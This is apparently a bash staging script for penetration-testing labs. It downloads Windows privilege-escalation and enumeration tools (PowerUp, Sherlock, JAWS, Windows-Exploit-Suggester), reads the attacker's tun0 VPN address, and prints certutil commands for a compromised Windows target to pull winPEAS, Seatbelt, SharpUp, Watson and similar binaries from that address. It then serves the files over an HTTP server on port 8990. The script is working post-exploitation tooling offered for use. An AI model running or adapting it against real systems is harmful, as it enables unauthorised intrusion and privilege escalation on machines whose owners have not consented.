#!/bin/bash

if [ ! -f "PowerUp.ps1" ]; then
  wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
fi

if [ ! -f "Sherlock.ps1" ]; then
  wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
fi

if [ ! -f "jaws-enum.ps1" ]; then
  wget https://raw.githubusercontent.com/411Hall/JAWS/master/jaws-enum.ps1
fi

if [ ! -f "windows-exploit-suggester.py" ]; then
  wget https://raw.githubusercontent.com/AonCyberLabs/Windows-Exploit-Suggester/master/windows-exploit-suggester.py
fi

ip=$(ip addr | grep tun0 | grep inet | grep 10. | tr -s " " | cut -d " " -f 3 | cut -d "/" -f 1)

echo ""
echo "You can download any of these tools on your target using commands below:"
echo ""
echo "certutil.exe -urlcache -split -f http://$ip:8990/accesschk.exe accesschk.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/winPEASany.exe winPEASany.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Seatbelt.exe Seatbelt.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/SharpUp.exe SharpUp.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/PowerUp.exe PowerUp.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Sherlock.exe Sherlock.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/Watson.exe Watson.exe"
echo "certutil.exe -urlcache -split -f http://$ip:8990/jaws-enum.exe jaws-enum.exe"
echo ""

sudo python3 -m http.server 8990
